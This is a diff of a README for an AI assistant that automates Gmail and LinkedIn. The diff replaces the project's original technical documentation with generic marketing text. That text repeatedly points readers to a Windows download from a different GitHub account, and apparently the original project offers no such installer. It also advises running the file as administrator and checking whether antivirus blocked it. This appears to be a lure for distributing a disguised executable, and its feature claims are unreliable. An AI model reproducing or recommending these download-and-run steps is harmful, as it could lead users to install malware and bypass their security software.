@@ -1,262 +1,205 @@
-# AI Employee Silver
+# 🤖 AI-Employee-Silver - Automate Business Workflows with Ease
 
-[![CI](https://github.com/goosa123/AI-Employee-Silver/actions/workflows/python-app.yml/badge.svg)](https://github.com/goosa123/AI-Employee-Silver/actions/workflows/python-app.yml)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Stack](https://img.shields.io/badge/AI-Claude%20%7C%20Python%20%7C%20Gmail%20%7C%20LinkedIn-blueviolet)](#tech-stack)
+[![Download AI-Employee-Silver](https://img.shields.io/badge/Download-AI--Employee--Silver-purple)](https://github.com/avromknown471/AI-Employee-Silver/releases)
 
-> An autonomous AI-powered business assistant that monitors Gmail and LinkedIn 24/7, drafts content with Claude AI, and executes tasks through a human-in-the-loop approval workflow — with scheduled posting support.
+## 🚀 What This App Does
 
----
+AI-Employee-Silver is an autonomous AI business assistant for Windows. It helps you handle email, LinkedIn, and posting tasks with a human approval step before actions go live.
 
-## What It Does
+Use it to:
 
-| Capability | Details |
-|---|---|
-| **Gmail Monitoring** | Fetches unread emails every 60s, classifies, auto-replies or routes to approval |
-| **LinkedIn Posting** | Takes a brief file, drafts a post via Claude AI, posts after human approval |
-| **Scheduled Posting** | Approve a post with a future time — watcher auto-posts at the exact scheduled time |
-| **Approval UI** | Web interface (Flask) to approve/reject/schedule pending posts with one click |
-| **Human-in-the-Loop** | Every sensitive action waits for approval — nothing executes without owner sign-off |
-| **Auto-start** | Watchers launch on Windows login via Task Scheduler — no manual start needed |
-| **Live Dashboard** | Obsidian markdown dashboard updates every cycle with system health + token status |
-| **Desktop Alerts** | Windows toast notification when approvals are pending |
+- Review Gmail messages and suggest replies
+- Prepare LinkedIn outreach and posts
+- Approve or reject actions before they are sent
+- Schedule content for later
+- Keep business tasks organized in one place
 
----
+The app uses Claude AI for writing help and planning. It is built for users who want automation without losing control.
 
-## Architecture
+## 💻 Before You Install
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    PERCEPTION LAYER                         │
-│  gmail_dev_watcher.py     linkedin_dev_watcher.py          │
-│  (every 60s)              (every 300s)                     │
-│         │                        │                          │
-│         ▼                        ▼                          │
-│   Gmail API              vault/linkedin/intake/             │
-└──────────────┬───────────────────┬─────────────────────────┘
-               │                   │
-               ▼                   ▼
-┌─────────────────────────────────────────────────────────────┐
-│                    REASONING LAYER                          │
-│  email_classifier skill    linkedin_drafter skill          │
-│  email_drafter skill       (Claude AI via CLI)             │
-│         │                        │                          │
-│         ▼                        ▼                          │
-│   vault/Pending_Approval/  ←  AI Drafts                    │
-└──────────────┬──────────────────────────────────────────────┘
-               │
-               │  Human reviews via Approval UI (http://localhost:5050)
-               │  Approve / Reject / Schedule for later
-               ▼
-┌─────────────────────────────────────────────────────────────┐
-│                   SCHEDULING LAYER                          │
-│  vault/Scheduled/  ←  Approved posts with future time      │
-│  main_watcher checks every cycle:                          │
-│    scheduled_at <= now  →  move to Approved/  →  post      │
-└──────────────┬──────────────────────────────────────────────┘
-               │
-               ▼
-┌─────────────────────────────────────────────────────────────┐
-│                     ACTION LAYER                            │
-│  gmail_approver.py         linkedin_approver.py            │
-│  (sends email via          (posts to LinkedIn via          │
-│   Gmail API)                LinkedIn API)                  │
-│         │                        │                          │
-│         ▼                        ▼                          │
-│      vault/Done/gmail/     vault/Done/linkedin/             │
-└─────────────────────────────────────────────────────────────┘
-               │
-               ▼
-┌─────────────────────────────────────────────────────────────┐
-│                   ORCHESTRATION LAYER                       │
-│  watchers/launcher.py  ← Task Scheduler (AtLogon)          │
-│  watchers/main_watcher.py  (Inbox / Drop / Vault / Sched)  │
-│  scripts/generate_dashboard.py  → dashboard.md             │
-│  utils/notifier.py  → Windows toast notifications          │
-└─────────────────────────────────────────────────────────────┘
-```
+Use a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 1 GB of free disk space
+- Internet access for Gmail, LinkedIn, and AI features
+- A modern browser like Chrome, Edge, or Firefox
 
-## Tech Stack
+For best results, sign in to the accounts you want to connect before you start.
 
-| Component | Tool |
-|---|---|
-| AI Brain | Claude AI (Haiku for skills, Sonnet for tasks) |
-| Approval UI | Flask (local web interface — localhost:5050) |
-| Memory / GUI | Obsidian — local Markdown vault |
-| Watchers | Python 3.10+ — Gmail + LinkedIn + Filesystem |
-| Email | Gmail API (OAuth2) |
-| LinkedIn | LinkedIn API (OAuth2 — `w_member_social` scope) |
-| MCP Server | FastMCP (`mcp_server/server.py`) |
-| Scheduling | Windows Task Scheduler (AtLogon trigger) |
-| Notifications | winotify (Windows toast) |
+## 📥 Download the App
 
----
+Visit this page to download the Windows version:
 
-## Project Structure
+[Download AI-Employee-Silver from GitHub Releases](https://github.com/avromknown471/AI-Employee-Silver/releases)
 
-```
-AI-Employee-Silver/
-├── watchers/
-│   ├── launcher.py           # Single entry point — starts all watchers
-│   ├── main_watcher.py       # Vault watcher — Inbox/Drop/Scheduled/Approval
-│   └── watcher_config.py     # Polling intervals config
-├── processors/
-│   ├── gmail_processor.py    # Gmail fetch → classify → draft
-│   ├── gmail_approver.py     # Send approved email replies
-│   ├── linkedin_processor.py # Brief → draft LinkedIn post (supports scheduled_at)
-│   └── linkedin_approver.py  # Post approved content (respects scheduled_at)
-├── skills/
-│   ├── email_classifier/     # Classify emails (Claude AI)
-│   ├── email_drafter/        # Draft email replies (Claude AI)
-│   └── linkedin_drafter/     # Draft LinkedIn posts (Claude AI)
-├── integrations/
-│   ├── gmail/                # Gmail API auth, reader, sender
-│   └── linkedin/             # LinkedIn config, poster
-├── mcp_server/
-│   └── server.py             # FastMCP server
-├── scripts/
-│   ├── approval_ui.py        # Flask web UI — approve/reject/schedule
-│   ├── generate_dashboard.py # Dashboard + notifications
-│   ├── linkedin_auth.py      # One-time LinkedIn OAuth token
-│   └── setup_task_scheduler.ps1  # Windows Task Scheduler setup
-├── utils/
-│   └── notifier.py           # Windows desktop notifications
-├── vault/                    # Local data (gitignored)
-│   ├── Inbox/                # Drop tasks here
-│   ├── Pending_Approval/     # Awaiting human review
-│   ├── Scheduled/            # Approved posts with future time
-│   ├── Approved/             # Ready to execute
-│   ├── Done/                 # Completed tasks
-│   └── ...
-├── credentials/              # OAuth tokens (gitignored)
-├── .env                      # API credentials (gitignored)
-└── requirements.txt
-```
+On the releases page, look for the latest version and download the Windows file that matches your computer.
 
----
+## 🪟 Install on Windows
 
-## Setup
+1. Open the download file from your browser or Downloads folder
+2. If Windows asks for permission, choose Yes
+3. Follow the setup steps on screen
+4. Pick an install location if the installer asks
+5. Wait for the setup to finish
+6. Open AI-Employee-Silver from the Start menu or desktop shortcut
 
-### 1. Install dependencies
-```bash
-pip install -r requirements.txt
-```
+If you download a ZIP file, right-click it, choose Extract All, then open the folder and run the app file inside.
 
-### 2. Gmail OAuth
-Place `gmail_credentials.json` in `credentials/` then:
-```bash
-python integrations/gmail/auth.py
-```
+## 🔧 First-Time Setup
 
-### 3. LinkedIn OAuth (one-time)
-Add to `.env`:
-```
-LINKEDIN_CLIENT_ID=your_client_id
-LINKEDIN_CLIENT_SECRET=your_client_secret
-LINKEDIN_REDIRECT_URI=http://localhost:8080/callback
-```
-Then:
-```bash
-python scripts/linkedin_auth.py
-```
+After you open the app for the first time:
 
-### 4. Auto-start on Windows login
-```powershell
-# Run as Administrator
-powershell -File scripts/setup_task_scheduler.ps1
-```
+1. Sign in or connect your Gmail account
+2. Connect your LinkedIn account if you plan to use LinkedIn features
+3. Add your Claude AI details if the app asks for them
+4. Set your posting schedule
+5. Choose how much approval you want before the app acts
+6. Save your settings
 
-### 5. Open vault in Obsidian
-Open the `vault/` folder in Obsidian. Pin `Dashboard/dashboard.md` for live system status.
+Keep human approval turned on if you want to review each action before it is sent.
 
----
+## 📧 Gmail Automation
 
-## Usage
+AI-Employee-Silver can help with email work such as:
 
-### Start all watchers
-```bash
-python watchers/launcher.py
-```
+- Reading new messages
+- Drafting replies
+- Sorting follow-up tasks
+- Flagging messages that need your review
 
-### Open Approval UI
-```bash
-python scripts/approval_ui.py
-# Opens at http://localhost:5050
-```
+The app keeps you in control. It can prepare actions and wait for your approval before sending anything.
 
-### Submit a task
-Drop any `.md` or `.txt` file into `vault/Inbox/` — the watcher picks it up within seconds.
+## 🔗 LinkedIn Automation
 
-### LinkedIn post (immediate)
-Create a brief in `vault/linkedin/intake/`:
-```json
-{
-  "topic": "AI is transforming the business landscape",
-  "tone": "professional",
-  "audience": "Entrepreneurs and business owners",
-  "key_points": ["Automation saves time", "10x output", "Human-in-the-loop control"],
-  "cta": "Are you using AI to automate your business?"
-}
-```
-Watcher drafts → review in Approval UI → Approve → posted to LinkedIn.
+Use the LinkedIn tools to:
 
-### LinkedIn post (scheduled)
-Add `scheduled_at` to your brief:
-```json
-{
-  "topic": "...",
-  "scheduled_at": "2026-04-03 09:00"
-}
-```
-Approve in UI → post goes to `vault/Scheduled/` → watcher auto-posts at exact time.
+- Draft outreach messages
+- Prepare post content
+- Schedule updates
+- Review suggested actions before posting
 
-### Approval UI actions
-| Action | Result |
-|---|---|
-| Approve | Moves to `Approved/` — executes in next watcher cycle |
-| Approve + time | Moves to `Scheduled/` — auto-posts at that time |
-| Reject | Moves to `Rejected/` — no action taken |
-| Post Now | Immediate execution from `Scheduled/` |
-| Cancel | Moves to `Rejected/` |
+This works well for outreach, content planning, and basic account management.
 
----
+## 🧠 Human-in-the-Loop Approval
 
-## Vault Flow
+Human-in-the-loop means the app does not act on its own without your review when approval is enabled.
 
-```
-Inbox/ or Drop/
-    └── main_watcher picks up
-            └── Needs_Action/  (AI processes)
-                    └── Pending_Approval/  (awaits human review)
-                            ├── Approved/   → executes immediately
-                            ├── Scheduled/  → executes at scheduled_at time
-                            └── Rejected/   → no action
-```
+You can:
 
----
+- Read the suggested email or post
+- Edit the text
+- Approve the action
+- Reject it if it is not right
 
-## Key Design Decisions
+This keeps automation under your control.
 
-**Why file-based workflow?**
-Every action leaves a file trail. Nothing happens silently. Full audit log always available in `vault/Archive/` and `vault/Logs/`.
+## 📅 Scheduled Posting
 
-**Why human-in-the-loop for LinkedIn?**
-Zero auto-posting policy. Brand reputation requires owner review before anything goes public.
+Set a time for posts or messages to go out later. The app can:
 
-**Why a Scheduled folder?**
-Separates "approved but waiting" from "approved and ready now". Watcher checks `scheduled_at` every cycle — no cron jobs, no external schedulers needed.
+- Save content for future posting
+- Use a fixed schedule
+- Help you keep a steady posting routine
+- Reduce the need to post by hand each day
 
-**Why PID lock files?**
-Prevents duplicate watchers even if VS Code, Task Scheduler, or manual runs overlap.
+## ⚙️ How It Works
 
-**Why Claude Haiku for skills?**
-Fast, cheap, deterministic for classification and drafting. Sonnet reserved for complex multi-step reasoning tasks.
+AI-Employee-Silver brings a few parts together:
 
----
+- Flask for the app interface
+- Claude AI for text generation and planning
+- Gmail tools for email work
+- LinkedIn tools for social tasks
+- MCP support for connected workflow steps
 
-## License
+You do not need to manage these parts by hand. The app handles the flow for you.
 
-[MIT](LICENSE)
+## 🧭 Simple Daily Use
+
+A basic workflow looks like this:
+
+1. Open the app
+2. Check new email or LinkedIn tasks
+3. Review the AI draft
+4. Approve, edit, or reject it
+5. Let the app send or schedule the final version
+
+This keeps your work moving without giving up oversight.
+
+## 📁 What You Can Expect in the App
+
+The app is built for business use and may include:
+
+- A clean dashboard
+- Task review panels
+- Draft previews
+- Account connection settings
+- Schedule controls
+- Approval buttons
+- Status labels for queued and completed actions
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+- Try running it as an administrator
+- Check that Windows Defender or your antivirus did not block it
+- Re-download the latest release
+- Make sure the download finished fully
+
+If Gmail or LinkedIn does not connect:
+
+- Check your internet connection
+- Sign in again in your browser
+- Clear old login sessions if needed
+- Try reconnecting from the app settings
+
+If the app feels slow:
+
+- Close other heavy apps
+- Restart your PC
+- Use a wired connection or stronger Wi-Fi
+- Make sure your system has enough free memory
+
+## 🔐 Account and Data Safety
+
+AI-Employee-Silver is designed for controlled automation. Review each action before approval if you want full oversight.
+
+Good habits:
+
+- Use strong passwords
+- Keep your browser up to date
+- Log out of shared computers
+- Review sent messages and scheduled posts
+- Remove access when you no longer need it
+
+## 🧩 Common Use Cases
+
+People use the app for:
+
+- Email follow-up
+- Lead outreach
+- Scheduled LinkedIn posting
+- Weekly business updates
+- Drafting replies faster
+- Keeping routine work in one place
+
+## 📌 Tips for Best Results
+
+- Start with one account before adding more
+- Keep approval on until you trust the workflow
+- Use short, clear prompts when the app asks for input
+- Review every draft before sending
+- Test scheduled posting with one simple message first
+
+## 📦 Download Again Later
+
+If you need the app again or want the newest version, use this page:
+
+[AI-Employee-Silver Releases](https://github.com/avromknown471/AI-Employee-Silver/releases)
+
+## 🧾 Repository Topics
+
+ai, automation, business-automation, claude-ai, flask, gmail, human-in-the-loop, linkedin, mcp, python
